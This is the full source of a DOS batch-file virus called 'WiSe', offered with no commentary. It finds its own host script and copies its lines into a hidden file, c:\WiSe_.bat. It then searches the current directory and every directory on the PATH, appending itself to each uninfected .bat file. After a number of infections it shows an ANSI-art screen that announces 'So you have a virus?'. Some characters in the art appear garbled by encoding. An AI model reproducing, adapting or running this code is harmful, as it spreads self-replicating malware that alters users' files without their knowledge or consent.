@if not '%wise%=='Host goto wise_beg
:: dummy host
@if '%WiSe%=='Host goto WiSe_end
:WiSe_beg
@echo off %_WiSe%
if '%1=='#! goto WiSe_%2
set WiSeN=%0
if '%0==' set WiSeN=autoexec
set WiSeC=%1 %2 %3 %4 %5 %6 %7 %8 %9
call %WiSeN% #! run
set WiSe=x.$
if exist c:\WiSe_.bat goto WiSe_shell
if exist %WiSeN% set WiSe=%WiSeN%
if exist %WiSeN%.bat set WiSe=%WiSeN%.bat
if exist %WiSe% goto WiSe_root 
%WiSeN% #! L1 %path%
:WiSe_L1
shift %_WiSe%
if '%2==' goto WiSe_out
if exist %2%WiSeN% set WiSe=%2%WiSeN%
if exist %2%WiSeN%.bat set WiSe=%2%WiSeN%.bat
if exist %2\%WiSeN% set WiSe=%2\%WiSeN%
if exist %2\%WiSeN%.bat set WiSe=%2\%WiSeN%.bat
if not exist %WiSe% goto WiSe_L1
:WiSe_root
find "WiSe"<%WiSe%>c:\WiSe_.bat
attrib c:\WiSe_.bat +h
:WiSe_shell
command /e:5000 /c c:\WiSe_ #! par . .. %path%
:WiSe_out
set WiSe=
set WiSeN=
set WiSeC=
goto WiSe_end
:WiSe_run
set WiSe=Host
%WiSeN% %WiSeC%
:WiSe_par
shift %_WiSe%
if '%2==' exit WiSe
for %%i in (%2\*.bat %2*.bat) do call c:\WiSe_ #! inf %%i
goto WiSe_par
:WiSe_inf
find "WiSe"<%3>nul
if not errorlevel 1 goto WiSe_S
echo @if not '%%wise%%=='Host goto wise_beg>WiSe$
type %3>>WiSe$
echo.>>WiSe$
type c:\WiSe_.bat>>WiSe$
move WiSe$ %3>nul
if not '%WiSeX%=='11111 exit
set WiSe=echo
%WiSe% [0;37;40m[2J[1;31m[3;10H浜様様様様様様様様様様様様融[4;10H�[37;44m                          
%WiSe% [4;37H[31;40m�[5;10H�[37;44m  My Olsa, jukko you      [31;40m�[6;10H�[37;44m  Grumbada, see
%WiSe% [6;26H gretchus  [31;40m�[7;10H�[37;44m  Umbla Umbla Motto       [31;40m�[8;10H�[37;44m  So
%WiSe% [8;15H you have a virus?    [31;40m�[9;10H�[37;44m                          [31;40m�[10;10H�
%WiSe% [10;11H様様様様様様様様様様様様様�[32m[12;12H� [0;33;40m[12;25HThe Forward is beneath me
%WiSe% [1;32m[13;11H芦屋[0;33;40m[13;25HBehind me becomes my left[1;32m[14;8H碓渦憶葦臆[0;33;40m
%WiSe% [14;25HI look up and see earth below[1;32m[15;9H旭憶臆臼葦�[0;33;40m[15;25HJust as reality be
%WiSe% [15;43Hcame not.[1;32m[16;10H葦臆碓芦[17;11H�[17;15H葦[36m[17;25HMy god! It's full of stars
%WiSe% [17;51H![23;1H[0m
exit WiSe
:WiSe_S
set WiSeX=%WiSeX%1
if %WiSeX%==1111111111111111 exit
:WiSe_end
